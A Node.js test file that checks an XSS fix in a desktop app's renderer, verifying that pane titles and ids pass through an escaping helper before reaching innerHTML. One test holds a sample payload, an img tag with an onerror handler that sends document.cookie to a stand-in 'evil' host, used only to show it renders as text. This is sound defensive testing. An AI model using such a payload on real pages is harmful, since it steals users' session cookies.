"use strict";
/**
 * W-36 (JS half) — two `innerHTML` sinks interpolated model- and system-supplied text unescaped.
 *
 * R-54, CONFIRMED: `renderer.js` builds the status-card rail and the minimized strip with template
 * literals and assigns them to `innerHTML`, interpolating `info.title`, `c.id`, `c.priority`,
 * `info.sessionState`, `m.title` and `m.id` raw. `esc()` already existed at `:607` and was used by
 * the inspector panels a hundred lines below — the escaping helper was present and simply not
 * applied to these two.
 *
 * WHERE A HOSTILE TITLE COMES FROM, stated rather than assumed. Pane titles are not free text from
 * the internet: they come from the launch chrome, from provider and model identifiers, and from
 * `spec.title` on the pane-creation path. W-29 made `title` one of the three fields a renderer may
 * set. So this is not a remote-attacker path — it is the same class as the log leak in W-35, where
 * text that crossed a boundary was rendered by a surface that trusted it. The fix is one call per
 * interpolation and the helper was already there, which is the whole reason it is worth doing
 * rather than arguing about reachability.
 *
 * EVIDENCE SHAPE. `renderer/renderer.js` runs in a browser context with no module boundary and
 * cannot be required — the same limitation `runtime-honesty-wiring.test.js` records for it. The
 * sink assertions are therefore SOURCE PINS over an executable-only view. `esc` itself is a pure
 * one-liner, so it is extracted and EVALUATED, which makes the "renders as text" claim behavioural
 * rather than a promise about a regex nobody ran.
 */
const { test } = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const RENDERER = fs.readFileSync(
  path.resolve(__dirname, "..", "renderer", "renderer.js"), "utf8");

const slice = (source, from, to) => {
  const start = source.indexOf(from);
  const end = source.indexOf(to, start);
  assert.ok(start > 0 && end > start, `could not locate ${from} … ${to}`);
  return source.slice(start, end);
};

const executableOnly = (region) =>
  region.replace(/\/\*[\s\S]*?\*\//g, "")
    .split("\n").filter((line) => !/^\s*\/\//.test(line)).join("\n");

/** `esc` lifted out of the shipped bytes and evaluated, so the claim below is about the real one. */
const loadEsc = () => {
  const definition = slice(RENDERER, "const esc = (s) =>", "\nfunction renderInspector");
  const context = { module: {} };
  vm.createContext(context);
  vm.runInContext(`${definition}\nmodule.exports = esc;`, context);
  return context.module.exports;
};

test("W-36 NEGATIVE: a title of `<img src=x onerror=…>` renders as TEXT, not as an element", () => {
  const esc = loadEsc();
  const payload = '<img src=x onerror="fetch(\'http://evil/\'+document.cookie)">';
  const escaped = esc(payload);
  assert.ok(!escaped.includes("<img"), "the tag survived escaping");
  assert.ok(!escaped.includes('"'), "the attribute quotes survived, so the attribute can still close");
  assert.match(escaped, /&lt;img src=x onerror=&quot;/, "it must render as visible text");
  // The four characters that let interpolated text escape an HTML context.
  assert.strictEqual(esc('&<>"'), "&amp;&lt;&gt;&quot;");
  // `&` must be replaced FIRST or the other replacements get double-escaped into visible garbage.
  assert.strictEqual(esc("<"), "&lt;", "a lone < must not become &amp;lt;");
});

test("W-36 NEGATIVE: the status-card rail escapes every interpolated value", () => {
  const region = executableOnly(slice(RENDERER, "rail.innerHTML = plan.cards.length", "min ="));
  for (const raw of ["${info.title || c.id}", "${c.id}", "${c.priority}",
    "${info.sessionState || \"—\"}"]) {
    assert.ok(!region.includes(raw),
      `${raw} is interpolated RAW into innerHTML — esc() exists in this file and is not applied`);
  }
  // Every `${...}` in this region must pass through esc(). Asserted as a property over the region
  // rather than as a list, so a NEW interpolation added later is caught too.
  const interpolations = region.match(/\$\{[^}]*\}/g) || [];
  assert.ok(interpolations.length > 0, "the region no longer interpolates — the slice is wrong");
  for (const expr of interpolations) {
    assert.match(expr, /esc\(/, `${expr} reaches innerHTML without esc()`);
  }
});

test("W-36 NEGATIVE: the minimized strip escapes every interpolated value", () => {
  const region = executableOnly(slice(RENDERER, "min.innerHTML = state.minimized.length",
    "min.querySelectorAll"));
  const interpolations = region.match(/\$\{[^}]*\}/g) || [];
  assert.ok(interpolations.length > 0, "the region no longer interpolates — the slice is wrong");
  for (const expr of interpolations) {
    assert.match(expr, /esc\(/, `${expr} reaches innerHTML without esc()`);
  }
});

test("W-36 POSITIVE: ordinary titles are unchanged by escaping", () => {
  const esc = loadEsc();
  assert.strictEqual(esc("CONDUCTOR"), "CONDUCTOR");
  assert.strictEqual(esc("qwen3:8b"), "qwen3:8b");
  assert.strictEqual(esc("worker — reasoning"), "worker — reasoning");
  assert.strictEqual(esc(null), "", "a missing title must not render the string 'null'");
});
